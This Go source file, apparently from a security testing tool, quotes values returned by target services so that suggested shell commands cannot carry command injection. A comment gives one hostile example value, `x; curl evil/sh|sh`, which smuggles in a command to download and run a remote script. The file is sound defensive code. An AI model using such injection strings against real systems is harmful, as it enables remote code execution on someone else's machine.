package main

import "strings"

// shellSafeArg renders a value for inclusion in a copy-pasteable shell command in
// the Next-Actions output. Discovered identifiers — model names, pipeline ids,
// entities, endpoints, file refs — come from TARGET-CONTROLLED service responses,
// so a hostile value such as `x; curl evil/sh|sh` must not turn a suggested command
// into operator-side command injection when the operator pastes it. Values that are
// already shell-safe (the overwhelmingly common case) and the guidance placeholder
// tokens like <model>/<namespace> are returned unchanged so clean commands stay
// readable; anything else is single-quoted, with embedded single quotes escaped as
// '\”, so the shell treats it as one literal argument.
//
// Interpolate the discovered value through this at the point it enters a command
// string: build commands as `"tfserving --target "+target+" metadata --model "+shellSafeArg(model)`.
func shellSafeArg(s string) string {
	if s == "" || shellArgIsSafe(s) || isGuidancePlaceholder(s) {
		return s
	}
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// shellArgIsSafe reports whether every rune of s is safe to leave unquoted as a
// POSIX shell argument — no metacharacters, whitespace, quotes, or globbing. The
// allowed punctuation is the set that appears in legitimate model names, URLs,
// paths, and entity slugs and has no shell meaning in argument position.
func shellArgIsSafe(s string) bool {
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
		case strings.ContainsRune("-_./:=@%+,", r):
		default:
			return false
		}
	}
	return true
}

// isGuidancePlaceholder reports whether s is a fixed <token> the builders emit for
// a value the operator must supply (e.g. <model>, <a-discovered-model>, <namespace>).
// These are NOT target data, so they are left bare for readability; they contain
// angle brackets (which shellArgIsSafe rejects) but only letters, digits, and '-'
// inside, never shell metacharacters.
func isGuidancePlaceholder(s string) bool {
	if len(s) < 3 || s[0] != '<' || s[len(s)-1] != '>' {
		return false
	}
	for _, r := range s[1 : len(s)-1] {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-':
		default:
			return false
		}
	}
	return true
}
